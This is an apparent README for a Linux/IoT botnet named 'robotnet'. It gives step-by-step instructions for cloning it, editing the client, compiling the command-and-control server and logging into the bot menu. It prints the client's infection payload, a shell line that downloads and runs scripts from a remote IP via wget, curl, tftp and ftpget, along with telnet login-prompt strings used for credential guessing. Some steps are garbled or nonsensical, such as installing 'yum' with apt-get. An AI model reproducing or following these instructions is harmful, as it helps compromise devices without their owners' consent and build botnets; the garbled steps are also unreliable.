# robotnet
This is a Ubuntu botnet for OS_linux and linux

GETTING THE BOTNET 
sudo apt-get install git (this will install git )
git clone https://github.com/robotikmaniac/robotnet







dir  (This should be under robotnet)
cd robotnet
PACKAGES SHOULD INCLUDE
CC7.py    <<   python
CLIENT.C  <<   C++
server.C  <<   C++






PREP FOR BOTNET
nano client.c
(((((
skip past the includes
skip past the mozzilas
make sure you see this

char* phone[] = {":", "ogin", "sername", "assword", "Linux", "9615-cdp", (char*)0};
char *Busybox_Payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.177.230.28/bins.sh; curl -O 
http://94.177.230.2/bin.sh; /bin/busybox tftp 94.177.230.28 -c get tftp1.sh; chmod 777 bins.sh; sh bins.sh; tftp 94.177.230.28 -c get 
tftp -r tftp1.sh -g 94.177.230.28; chmod 777 tftp1.sh; sh tftp1.sh; ftpget -v -u anonymous -p anonymous -P 21 94.177.230.28 ftp1.sh

)))))))))))









(EDIT THE IP)
 LINE 224     ===   94.177.230.28:812  (change to)  {{  "your ip":23    }}
 
 MAKE SURE WHEN YOU EDIT THE IP'S CORRECT on one of the lines theres a IP thats looks LIKE 94.177.230.2
 (make sure to take off one of the numbers ) to the ip
 
 example (IP) 192.168.1.72
 if 94.177.230.28 make it look like 192.168.1.72     
 if the ip looks like 94.177.230.2   make it look like 192.168.1.72
 
 after you have done all of that
 
 
 
 
 
 
 
 
 
 
 
 
 (COMPILE THE BOTNET)
 THE PACKAGES YOU WILL NEED
 
 sudo apt-get install yum               
 (MIGHT UPDATE)
 
 sudo apt-get install python3           
 (JUST DO IT IT MIGHT HAVE A NEW VERSION)
 
 sudo apt-get install python-paramiko   
 (JUST DO IT IT MIGHT HAVE A NEW VERSION)
 
 sudo apt-get install nano              
 (JUST DO IT IT MIGHT HAVE A NEW VERSION
 
 sudo apt-get install screen            
 (MOST OF LINUX OS's SO NOT HAVE SCREEN INSTALLED)
 
 sudo apt-get install gcc               
 (JUST DO IT IT MIGHT HAVE A NEW VERSION)
 
 sudo apt-get install perl              
 (NEW VERSIONS OF PERL GET REALESED MONTHLY/WEEKLY)
 
 sudo apt-get install wget              
 (JUST DO IT IT MIGHT HAVE A NEW VERSION)
 
 sudo apt-get install zip               
 (BOLTH ARE NEEDED FOR THE DOWNLOAD)
 
 sudo apt-get install zip2             
 (BOLTH ARE NEEDED FOR THE DOWNLOAD)
 
 sudo apt-get install unzip            
 (JUST DO IT IT MIGHT HAVE A NEW VERSION)
 
 
 
 
 
 
 
 THOSE ARE ALL THE PACKAGES YOU NEED AFTER THAT I DO RECOMEND DOING
 sudo apt-get update     (DO THIS)
 sudo apt-get upgrade
 sudo apt-get update     (yes i typed this again on perpose)
 
 
 
 
 
 
 
 
 
 
 
 
 (RUNNING THE BOTNET)
 
 gcc server.c -o server -pthread
 ignore the warnings its just telling you that its going to port fowward using telnet-RAW
 
 
 python cc7.py client.c (PUT SERVERS IP HERE)
 THIS WILL TAKE ABOUT 10 mins to install
 
 
 
(PORT FOWWARDING THE BOTNET)
THIS MAY NOT WORK IF USING A PRIVATE IP BUT IF YOU USED A EXTERNAL IP THIS WILL WORK FINE

screen ./server 23 1 (PORT 1-9999)
IF IT SAYS OTHER SYSTEM IS USING THE IP DONT WORRY IT WILL STILL WORK
IF IT HAS A BLACK SCREEN THE BOTNET IS PORT FOWWARDING









(CONNECT TO THE BOTNET)
GO INTO PUTTY then type your (IP OF CHOICE)
SELECT A RAW CONNECTON TYPE 
THEN TYPE THE PORT YOU USED (1-9999)
if you see something that sese
robotnet (THEN YOU HAVE CONNECTED TO YOUR BOTNET)
GO BACK TO YOUR SESSION 
PRESS "CTRL C"
then add some acounts 
USERNAME MUST BE >>>root<<< NO CAPS
echo root (PASSWORD OF CHOICE) >>login.txt
(AFTER THAT YOU HAVE JUST ADDED A ACOUNT)
PORT FOWWORD YOUR BOTNET AGAIN 
THEN use
username root
password of your choice
you should be greeted to a menu with the rules of the server 










(INFO ABOUT THE BOTNET)
SCANNERS MUST BE ADDED BY YOURSELF
SERVALENCE AND PRIVACY ALSO MUST BE ADDED BY YOURSELF
I RECOMEND USING LONG PROTECTIVE PASSWORDS
